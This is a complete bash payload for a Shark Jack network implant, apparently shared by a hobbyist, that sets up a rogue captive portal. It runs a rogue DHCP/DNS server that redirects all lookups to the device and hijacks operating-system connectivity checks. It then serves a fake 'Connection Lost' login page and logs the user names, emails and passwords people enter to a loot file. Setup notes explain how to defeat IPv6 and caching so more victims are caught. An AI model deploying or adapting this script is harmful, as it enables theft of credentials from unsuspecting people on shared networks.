#!/bin/bash
# Title: Gateway Ghost
# Description: Captive portal logger
# Author: Hackazillarex
# Version: 1.0
#
# ====================================================================
# SETUP INSTRUCTIONS
# ====================================================================
#
# NO DEPENDENCIES REQUIRED
# socat and dnsmasq come pre-installed on the Shark Jack Display.
#
# LOOT LOCATION:
# All logs saved to: /root/loot/ghost_portal/
#
# Files generated:
#   - ghost_capture.log   (credentials)
#   - portal.log      (HTTP request log)
#   - error.log       (service error log)
#
# ====================================================================
# KNOWN LIMITATIONS
# ====================================================================
#
# For best results, connecting devices should meet these conditions:
#
# 1. NEW OR RETURNING DEVICE WITH CLEARED CACHE
#    Devices that have previously visited pages on this network
#    may load them from browser cache, bypassing the portal.
#    To clear cache in Edge/Chrome: Ctrl+Shift+Del → Clear all
#    Private/Incognito browsing also bypasses cache.
#
# 2. IPv6 DISABLED ON DEVICE
#    Devices with IPv6 enabled may use IPv6 DNS servers assigned
#    by the real router, bypassing the Shark Jack DNS sinkhole.
#    To disable IPv6 on Windows:
#    Network Settings → Adapter Properties → uncheck IPv6
#
# 3. NEW PAGES TRIGGER PORTAL
#    Previously visited pages load from cache without DNS lookup.
#    Visiting a new/uncached page will trigger the portal correctly.
#
# NOTE: Some functions were removed but logic is still in the payload 
#       in case I decide to add them back later.
# ====================================================================


setup_payload() {
  LED SETUP
  RUN_DIR="/tmp/portal"
  PORTAL_DIR="$RUN_DIR/web"
  GHOST_IF="eth0"
  LOOT_BASE="/root/loot/ghost_portal"
  mkdir -p "$PORTAL_DIR"
  mkdir -p "$LOOT_BASE"
}

get_shark_jack_ip() {
  /sbin/ip addr show "$GHOST_IF" | grep "inet " | awk '{print $2}' | cut -d/ -f1
}

initialize_menu() {
  ADD_MENU_ITEM "Start Ghost Portal" "start_portal"
  ADD_MENU_ITEM "Stop Portal" "stop_portal"
  ADD_MENU_ITEM "Quit" "EXIT_MENU"
}

write_portal_files() {
  SHARK_JACK_IP=$(get_shark_jack_ip)
  NET_PREFIX=$(echo "$SHARK_JACK_IP" | cut -d. -f1-3)

  cat > "$PORTAL_DIR/portal.html" << 'HTML'
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Alert! - Connection Lost</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f4f5f7;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:420px;width:100%;padding:32px 28px;text-align:center}
h1{font-size:20px;font-weight:600;margin-bottom:8px}
p{font-size:14px;color:#5f6368;line-height:1.5;margin-bottom:24px}
input,textarea{width:100%;padding:10px 12px;margin:6px 0 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;font-family:inherit}
textarea{height:45px;resize:none}
.btn{display:inline-block;width:100%;background:#1a73e8;color:#fff;border:0;border-radius:8px;padding:12px 20px;font-size:15px;font-weight:600;cursor:pointer}
.footer{margin-top:20px;font-size:12px;color:#9aa0a6}
label{font-size:13px;color:#444;text-align:left;display:block}
</style></head>
<body><div class="card">
<h1>Connection Lost!</h1>
<p> Log In and hit Continue to start browsing.</p>
<form method="POST" action="/ghostcapture">
<label>User Name</label>
<input name="name" placeholder="Enter your user name" required>
<label>E-mail</label>
<textarea name="email" placeholder="Enter your email"></textarea>
<label>Password</label>
<textarea name="password" placeholder="Enter your password"></textarea>
<button class="btn" type="submit">Continue</button>
</form>
<div class="footer">By continuing you agree to the network's terms of use.</div>
</div></body></html>
HTML

  cat > "$RUN_DIR/dnsmasq_state_locked.conf" << EOF
address=/#/${SHARK_JACK_IP}
EOF

  cat > "$RUN_DIR/dnsmasq_state_unlocked.conf" << 'EOF'
EOF

  cp "$RUN_DIR/dnsmasq_state_locked.conf" "$RUN_DIR/dnsmasq_state.conf"

  cat > "$RUN_DIR/dnsmasq.conf" << EOF
interface=${GHOST_IF}
dhcp-range=${NET_PREFIX}.100,${NET_PREFIX}.200,1m
dhcp-option=3,${SHARK_JACK_IP}
dhcp-option=6,${SHARK_JACK_IP}
no-resolv
filter-AAAA
conf-file=${RUN_DIR}/dnsmasq_state.conf
EOF

  cat > "$RUN_DIR/toggle_gate.sh" << EOF
#!/bin/sh
REAL_GW=\$(ip route | grep default | awk '{print \$3}' | head -1)
case "\$1" in
  lock)
    echo 0 > /proc/sys/net/ipv4/ip_forward
    ip route del default 2>/dev/null
    cp ${RUN_DIR}/dnsmasq_state_locked.conf ${RUN_DIR}/dnsmasq_state.conf
    killall -HUP dnsmasq
    ;;
  unlock)
    [ -n "\$REAL_GW" ] && ip route replace default via "\$REAL_GW" dev ${GHOST_IF}
    echo 1 > /proc/sys/net/ipv4/ip_forward
    cp ${RUN_DIR}/dnsmasq_state_unlocked.conf ${RUN_DIR}/dnsmasq_state.conf
    killall -HUP dnsmasq
    ;;
esac
EOF
  chmod +x "$RUN_DIR/toggle_gate.sh"

  cat > "$RUN_DIR/portal_handler.sh" << EOF
#!/bin/sh
PORTAL_DIR="${PORTAL_DIR}"
TOGGLE_SCRIPT="${RUN_DIR}/toggle_gate.sh"
SHARK_JACK_IP=\$(/sbin/ip addr show eth0 | grep "inet " | awk '{print \$2}' | cut -d/ -f1)
read -r REQUEST_LINE
REQUEST_LINE=\$(printf "%s" "\$REQUEST_LINE" | tr -d '\r\n')
CONTENT_LENGTH=0
while read -r HEADER; do
  HEADER_CLEAN=\$(printf "%s" "\$HEADER" | tr -d '\r\n')
  [ -z "\$HEADER_CLEAN" ] && break
  case "\$HEADER_CLEAN" in
    [Cc]ontent-[Ll]ength:*) CONTENT_LENGTH=\$(printf "%s" "\$HEADER_CLEAN" | awk -F': *' '{print \$2}') ;;
  esac
done
[ "\$CONTENT_LENGTH" -gt 0 ] 2>/dev/null && POST_DATA=\$(dd bs=1 count="\$CONTENT_LENGTH" 2>/dev/null) || POST_DATA=""
METHOD=\$(printf "%s" "\$REQUEST_LINE" | awk '{print \$1}')
PATH_REQ=\$(printf "%s" "\$REQUEST_LINE" | awk '{print \$2}')
printf "[%s] %s\n" "\$(/bin/date '+%H:%M:%S')" "\$REQUEST_LINE" >> /root/loot/ghost_portal/portal.log
CACHE="Cache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nExpires: 0\r\nConnection: close\r\n"
PORTAL_URL="http://\${SHARK_JACK_IP}/portal.html"
send() {
  BODY="\$3"
  if [ "\$METHOD" = "HEAD" ]; then
    printf "%s\r\nContent-Type: %s\r\nContent-Length: %s\r\n\${CACHE}%s\r\n" "\$1" "\$2" "\${#BODY}" "\$4"
  else
    printf "%s\r\nContent-Type: %s\r\nContent-Length: %s\r\n\${CACHE}%s\r\n%s" "\$1" "\$2" "\${#BODY}" "\$4" "\$BODY"
  fi
}
case "\$PATH_REQ" in
  /connecttest.txt|/ncsi.txt)
    BODY="<html><head><meta http-equiv='refresh' content='0;url=\${PORTAL_URL}'></head><body>Redirecting...</body></html>"
    send "HTTP/1.1 302 Found" "text/html" "\$BODY" "Location: \${PORTAL_URL}\r\n" ;;
  /generate_204|/captiveportal/generate_204)
    send "HTTP/1.1 200 OK" "text/html" "" ;;
  /library/test/success.html|/hotspot-detect.html)
    BODY="<HTML><HEAD><TITLE>Redirect</TITLE><meta http-equiv='refresh' content='0;url=\${PORTAL_URL}'></HEAD><BODY>Redirecting...</BODY></HTML>"
    send "HTTP/1.1 302 Found" "text/html" "\$BODY" "Location: \${PORTAL_URL}\r\n" ;;
  /authorize)
    "\$TOGGLE_SCRIPT" unlock >/dev/null 2>&1
    BODY="<html><body style='font-family:Arial;text-align:center;padding:40px'><h2>You're connected!</h2><p>Internet access is now open. Enjoy!</p></body></html>"
    send "HTTP/1.1 200 OK" "text/html" "\$BODY" ;;
  /ghostcapture)
    if [ -n "\$POST_DATA" ]; then
      DECODED=\$(printf "%s" "\$POST_DATA" | sed 's/+/ /g' | sed 's/%21/!/g' | sed 's/%22/"/g' | sed 's/%23/#/g' | sed 's/%24/\$/g' | sed 's/%25/%/g' | sed 's/%26/\&/g' | sed 's/%27/'"'"'/g' | sed 's/%28/(/g' | sed 's/%29/)/g' | sed 's/%2C/,/g' | sed 's/%2E/./g' | sed 's/%2F/\//g' | sed 's/%3A/:/g' | sed 's/%3D/=/g' | sed 's/%3F/?/g' | sed 's/%40/@/g' | sed 's/%5E/^/g' | sed 's/%5F/_/g' | sed 's/%7B/{/g' | sed 's/%7D/}/g' | sed "s/%[0-9A-Fa-f][0-9A-Fa-f]//g")
      NAME=\$(printf "%s" "\$DECODED" | sed 's/name=//;s/&password=.*//')
      PASSWORD=\$(printf "%s" "\$DECODED" | sed 's/.*&password=//')
      printf "[%s] User Name & E-mail: %s | Password: %s\n" "\$(/bin/date '+%Y-%m-%d %H:%M:%S')" "\$NAME" "\$PASSWORD" >> /root/loot/ghost_portal/ghost_capture.log
    fi
    "\$TOGGLE_SCRIPT" unlock >/dev/null 2>&1
    BODY="<html><body style='font-family:Arial;text-align:center;padding:40px'><h2>Thank you for confirming your account!</h2><p>Internet access is now open. Enjoy!</p></body></html>"
    send "HTTP/1.1 200 OK" "text/html" "\$BODY" ;;
  *)
    if [ -f "\$PORTAL_DIR/portal.html" ]; then
      BODY=\$(cat "\$PORTAL_DIR/portal.html")
      send "HTTP/1.1 200 OK" "text/html" "\$BODY"
    else
      send "HTTP/1.1 404 Not Found" "text/plain" "Not found"
    fi ;;
esac
EOF
  chmod +x "$RUN_DIR/portal_handler.sh"
}

start_portal() {
  LOG "Ghost Portal: Waiting for network..."
  sleep 5
  LOG "Ghost Portal: Deploying files..."
  write_portal_files

  LOG "Ghost Portal: Locking guest network..."
  LED ATTACK
  "$RUN_DIR/toggle_gate.sh" lock

  pkill -9 dnsmasq 2>/dev/null
  sleep 2
  dnsmasq -C "$RUN_DIR/dnsmasq.conf" >> "$LOOT_BASE/error.log" 2>&1 &
  sleep 2

  pkill -f "socat TCP-LISTEN:80" 2>/dev/null
  sleep 1
  socat TCP-LISTEN:80,reuseaddr,fork EXEC:"$RUN_DIR/portal_handler.sh" >> /root/loot/ghost_portal/portal.log 2>> "$LOOT_BASE/error.log" &
  sleep 1

  if pgrep -f "dnsmasq -C" > /dev/null && pgrep -f "socat TCP-LISTEN:80" > /dev/null; then
    LED READY
    ALERT "Ghost Portal Active\n\nShark Jack: $(get_shark_jack_ip)\nNetwork: LOCKED\nGuests see captive portal" 2 false
  else
    DNSMASQ_STATUS=$(pgrep -f "dnsmasq -C" > /dev/null && echo "OK" || echo "FAILED")
    SOCAT_STATUS=$(pgrep -f "socat TCP-LISTEN:80" > /dev/null && echo "OK" || echo "FAILED")
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] dnsmasq: $DNSMASQ_STATUS socat: $SOCAT_STATUS" >> "$LOOT_BASE/error.log"
    LED FAIL
    ALERT "Service Start Error\n\ndnsmasq: $DNSMASQ_STATUS\nHTTP: $SOCAT_STATUS" 3 false
  fi
}

stop_portal() {
  LOG "Ghost Portal: Stopping..."
  pkill -9 -f "dnsmasq -C" 2>/dev/null
  pkill -9 -f "socat TCP-LISTEN:80" 2>/dev/null
  echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
  ip route del default 2>/dev/null
  rm -f /tmp/portal/dnsmasq.leases 2>/dev/null
  LED FINISH
  ALERT "Ghost Portal Stopped" 2 false
}

setup_payload
initialize_menu
ALERT "Gatway Ghost\nv1.0\nCaptive Portal\nby Hackazillarex\n<- to Start" -1 false true
START_MENU

# Cleanup on exit
pkill -9 -f "dnsmasq -C" 2>/dev/null
pkill -9 -f "socat TCP-LISTEN:80" 2>/dev/null
echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

LED FINISH